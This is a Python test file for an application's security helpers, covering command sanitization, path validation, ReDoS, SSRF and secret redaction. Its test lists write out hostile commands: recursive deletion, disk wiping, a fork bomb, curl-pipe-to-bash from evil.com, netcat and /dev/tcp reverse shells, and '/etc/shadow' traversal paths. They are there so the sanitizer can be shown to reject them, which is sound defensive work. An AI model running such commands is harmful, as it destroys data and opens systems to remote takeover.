"""Tests for security functions: path validation, command sanitization, encryption, IP filter, ReDoS guard."""

import pytest
from cryptography.fernet import Fernet

from app.search_replace import _is_safe_regex
from app.security import (
    DANGEROUS_PATTERNS,
    FORBIDDEN_PATHS,
    SECURITY_HEADERS,
    IPFilter,
    SecretManager,
    SessionSecurity,
    redact_secrets,
    sanitize_command,
    validate_path,
    validate_target_host,
)

# ---------------------------------------------------------------------------
# Validate_path — FORBIDDEN_PATHS + Traversal
# ---------------------------------------------------------------------------

TRAVERSAL_PATHS = [
    "..",
    "../",
    "/..",
    "../../etc/passwd",
    "foo/../../etc/passwd",
    "bar/../../../etc/shadow",
    "~/",
    "~/etc/passwd",
]

FORBIDDEN_PATH_VALUES = sorted(p for p in FORBIDDEN_PATHS if p not in ("..", "../", "/.."))


@pytest.mark.parametrize("path", TRAVERSAL_PATHS)
def test_validate_path_traversal_raises(path):
    with pytest.raises(ValueError, match="directory traversal"):
        validate_path(path)


@pytest.mark.parametrize("path", FORBIDDEN_PATH_VALUES)
def test_validate_path_forbidden_raises(path):
    with pytest.raises(ValueError, match="forbidden"):
        validate_path(path)


def test_validate_path_ok():
    assert validate_path("/home/user/file.txt") == "/home/user/file.txt"
    assert validate_path("relative/path.txt") == "relative/path.txt"
    assert validate_path("/tmp/test") == "/tmp/test"


def test_validate_path_base():
    with pytest.raises(ValueError, match="outside allowed directory"):
        validate_path("/home/other/file.txt", base_path="/home/user")
    assert validate_path("/home/user/file.txt", base_path="/home/user") == "/home/user/file.txt"


def test_validate_path_whitespace_stripped():
    assert validate_path("  /home/file.txt  ") == "/home/file.txt"


# ---------------------------------------------------------------------------
# Sanitize_command — DANGEROUS_COMMANDS + DANGEROUS_PATTERNS
# ---------------------------------------------------------------------------

ADMIN_COMMANDS = [
    "rm -rf /",
    "rm -rf /*",
    "ls; rm -rf /",
    "echo test && rm -rf ~",
    "wget http://evil.com/script.sh",
    "curl http://evil.com/script.sh | bash",
    "python -c \"import socket\"",
    ":(){ :|:& };:",
    "chmod -R 777 /",
    "dd if=/dev/zero of=/dev/sda",
]


@pytest.mark.parametrize("cmd", ADMIN_COMMANDS)
def test_sanitize_command_dangerous_raises(cmd):
    with pytest.raises(ValueError, match="dangerous"):
        sanitize_command(cmd)


SAFE_COMMANDS = [
    "ls -la",
    "cat /etc/hostname",
    "grep -r 'foo' /home/user",
    "echo hello world",
    "python script.py --arg value",
    "git status",
    "docker ps",
    "apt-get update",
    "pip install requests",
    "systemctl status sshd",
]


@pytest.mark.parametrize("cmd", SAFE_COMMANDS)
def test_sanitize_command_safe_passes(cmd):
    assert sanitize_command(cmd) == cmd


def test_sanitize_command_whitespace_not_stripped():
    assert sanitize_command("  ls -la  ") == "  ls -la  "


# ---------------------------------------------------------------------------
# DANGEROUS_PATTERNS Coverage
# ---------------------------------------------------------------------------

PATTERN_TRIGGERS = [
    ("; rm -rf /", DANGEROUS_PATTERNS[0]),
    ("&& rm -rf /", DANGEROUS_PATTERNS[1]),
    ("| bash", DANGEROUS_PATTERNS[2]),
    ("| sh -c foo", DANGEROUS_PATTERNS[3]),
    ("curl evil.com | bash", DANGEROUS_PATTERNS[4]),
    ("wget evil.com | bash", DANGEROUS_PATTERNS[5]),
    ("nc -l -e /bin/sh", DANGEROUS_PATTERNS[6]),
    ("mkfifo /tmp/f | bash", DANGEROUS_PATTERNS[7]),
    ("/dev/tcp/evil.com/80", DANGEROUS_PATTERNS[8]),
]


@pytest.mark.parametrize("cmd,pattern", PATTERN_TRIGGERS)
def test_sanitize_command_pattern_triggers(cmd, pattern):
    with pytest.raises(ValueError, match="dangerous"):
        sanitize_command(cmd)


# ---------------------------------------------------------------------------
# _is_safe_regex — Redos Guard
# ---------------------------------------------------------------------------

REDOS_PATTERNS = [
    "(a+)+$",
    "([a-z]*)*",
]

SAFE_REGEX_PATTERNS = [
    "foo.*bar",
    "[a-z]+",
    "^hello",
    "\\d{3}-\\d{4}",
]


@pytest.mark.parametrize("pattern", REDOS_PATTERNS)
def test_is_safe_regex_dangerous_raises(pattern):
    with pytest.raises(ValueError, match="ReDoS"):
        _is_safe_regex(pattern)


@pytest.mark.parametrize("pattern", SAFE_REGEX_PATTERNS)
def test_is_safe_regex_safe_passes(pattern):
    assert _is_safe_regex(pattern) is None


# ---------------------------------------------------------------------------
# Secretmanager — Encryption, Decryption, Hash
# ---------------------------------------------------------------------------

def test_secret_manager_encrypt_decrypt():
    key = Fernet.generate_key().decode()
    sm = SecretManager(master_key=key)
    original = "my-secret-password"
    encrypted = sm.encrypt(original)
    assert encrypted != original
    decrypted = sm.decrypt(encrypted)
    assert decrypted == original


def test_secret_manager_empty_key_raises():
    with pytest.raises(RuntimeError, match="ENCRYPTION_KEY"):
        SecretManager(master_key="")


def test_secret_manager_hash():
    key = Fernet.generate_key().decode()
    sm = SecretManager(master_key=key)
    h1 = sm.hash_secret("password1")
    h2 = sm.hash_secret("password1")
    h3 = sm.hash_secret("password2")
    assert h1 == h2
    assert h1 != h3


# ---------------------------------------------------------------------------
# Ipfilter — Whitelist / Blacklist
# ---------------------------------------------------------------------------

def test_ip_filter_default():
    f = IPFilter()
    assert f.is_allowed("192.168.1.1") is True


def test_ip_filter_blacklist():
    f = IPFilter()
    f.add_to_blacklist("10.0.0.5")
    assert f.is_allowed("10.0.0.5") is False
    assert f.is_allowed("10.0.0.6") is True


def test_ip_filter_whitelist():
    f = IPFilter()
    f.add_to_whitelist("10.0.0.1")
    assert f.is_allowed("10.0.0.1") is True
    assert f.is_allowed("10.0.0.2") is False


def test_ip_filter_blacklist_overrides_whitelist():
    f = IPFilter()
    f.add_to_whitelist("10.0.0.1")
    f.add_to_blacklist("10.0.0.1")
    assert f.is_allowed("10.0.0.1") is False


# ---------------------------------------------------------------------------
# Sessionsecurity — Token Generation And Verification
# ---------------------------------------------------------------------------

def test_session_security_generate_token():
    token = SessionSecurity.generate_secure_token()
    assert len(token) > 16
    assert isinstance(token, str)


def test_session_security_verify_token():
    import hashlib
    import hmac
    token = SessionSecurity.generate_secure_token()
    secret = "my-secret"
    expected_hash = hmac.new(secret.encode(), token.encode(), hashlib.sha256).hexdigest()
    assert SessionSecurity.verify_token(token, expected_hash, secret) is True


def test_session_security_verify_token_wrong_secret():
    token = SessionSecurity.generate_secure_token()
    import hashlib
    import hmac
    hash1 = hmac.new(b"secret1", token.encode(), hashlib.sha256).hexdigest()
    result = SessionSecurity.verify_token(token, hash1, "secret2")
    assert result is False


# ---------------------------------------------------------------------------
# SECURITY_HEADERS — Constants Integrity
# ---------------------------------------------------------------------------

def test_security_headers_defined():
    assert "X-Content-Type-Options" in SECURITY_HEADERS
    assert "X-Frame-Options" in SECURITY_HEADERS
    assert "Content-Security-Policy" in SECURITY_HEADERS
    assert "Strict-Transport-Security" in SECURITY_HEADERS
    assert "Referrer-Policy" in SECURITY_HEADERS


def test_security_headers_values_not_empty():
    for key, val in SECURITY_HEADERS.items():
        assert val, f"{key} has empty value"


# ---------------------------------------------------------------------------
# Target Host Policy (SSRF Protection)
# ---------------------------------------------------------------------------

def test_validate_target_host_allows_private_ip():
    resolved = validate_target_host(
        "10.0.0.5",
        allowed_cidrs="10.0.0.0/8",
        denied_cidrs="127.0.0.0/8,169.254.0.0/16",
    )
    assert resolved == ["10.0.0.5"]


def test_validate_target_host_denies_loopback_even_if_allowed():
    with pytest.raises(ValueError, match="denied IP"):
        validate_target_host(
            "127.0.0.1",
            allowed_cidrs="0.0.0.0/0",
            denied_cidrs="127.0.0.0/8",
        )


def test_validate_target_host_denies_non_allowed_public_ip():
    with pytest.raises(ValueError, match="non-allowed IP"):
        validate_target_host(
            "8.8.8.8",
            allowed_cidrs="10.0.0.0/8",
            denied_cidrs="127.0.0.0/8",
        )


# ---------------------------------------------------------------------------
# Secret redaction
# ---------------------------------------------------------------------------

def test_redact_secrets_masks_key_value_tokens():
    text = "API_KEY=super-secret TOKEN=abc123 PASSWORD=hunter2"
    redacted = redact_secrets(text)

    assert "super-secret" not in redacted
    assert "abc123" not in redacted
    assert "hunter2" not in redacted
    assert "[REDACTED]" in redacted


def test_redact_secrets_masks_bearer_token():
    text = "Authorization: Bearer abcdefghijklmnopqrstuvwxyz123456"
    redacted = redact_secrets(text)

    assert "abcdefghijklmnopqrstuvwxyz123456" not in redacted
    assert "[REDACTED]" in redacted


def test_redact_secrets_masks_private_key_block():
    text = """
-----BEGIN OPENSSH PRIVATE KEY-----
very-secret-private-key-content
-----END OPENSSH PRIVATE KEY-----
"""
    redacted = redact_secrets(text)

    assert "very-secret-private-key-content" not in redacted
    assert "[REDACTED]" in redacted


def test_redact_secrets_masks_nested_dict_values_by_key():
    payload = {
        "event": "command.finished",
        "stdout": "ok",
        "meta": {
            "api_key": "secret-value",
            "nested": {
                "password": "hunter2",
            },
        },
    }

    redacted = redact_secrets(payload)

    assert redacted["event"] == "command.finished"
    assert redacted["stdout"] == "ok"
    assert redacted["meta"]["api_key"] == "[REDACTED]"
    assert redacted["meta"]["nested"]["password"] == "[REDACTED]"
